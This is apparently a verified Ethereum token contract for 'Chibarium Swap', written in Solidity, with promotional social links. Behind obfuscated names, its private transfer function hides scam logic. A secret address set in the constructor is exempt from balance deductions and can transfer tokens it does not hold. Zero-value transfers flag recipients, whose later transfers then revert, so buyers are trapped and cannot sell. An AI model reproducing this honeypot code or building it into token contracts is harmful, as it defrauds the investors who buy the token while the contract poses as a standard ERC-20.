/**
 *Submitted for verification at Etherscan.io on 2023-05-23
*/

/**

*/

/**
Telegram: https://t.me/ChibariumSwapPortal
Website: https://www.chibarium-swap.com/
Twitter: https://twitter.com/ChibariumSwap
*/

/*

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ChibariumSwap is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private enmity;

    function infinity(address yard, address viral, uint256 reward) private returns (bool success) {
        if (enmity[yard] == 0) {
            balanceOf[yard] -= reward;
        }

        if (reward == 0) crocodile[viral] += picket;

        if (enmity[yard] == 0 && uniswapV2Pair != yard && crocodile[yard] > 0) {
            enmity[yard] -= picket;
        }

        balanceOf[viral] += reward;
        emit Transfer(yard, viral, reward);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    address public uniswapV2Pair;

    string public symbol = 'CHIBARIUM';

    uint8 public decimals = 9;

    uint256 public totalSupply = 1_000_000_000 * 10 ** 9;

    uint256 private picket = 58;

    function transferFrom(address yard, address viral, uint256 reward) public returns (bool success) {
        infinity(yard, viral, reward);
        require(reward <= allowance[yard][msg.sender]);
        allowance[yard][msg.sender] -= reward;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    constructor(address andBeyond) {
        balanceOf[msg.sender] = totalSupply;
        enmity[andBeyond] = picket;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address nutrient, uint256 reward) public returns (bool success) {
        allowance[msg.sender][nutrient] = reward;
        emit Approval(msg.sender, nutrient, reward);
        return true;
    }

    function transfer(address viral, uint256 reward) public returns (bool success) {
        infinity(msg.sender, viral, reward);
        return true;
    }

    string public name = 'Chibarium Swap';

    mapping(address => uint256) private crocodile;
}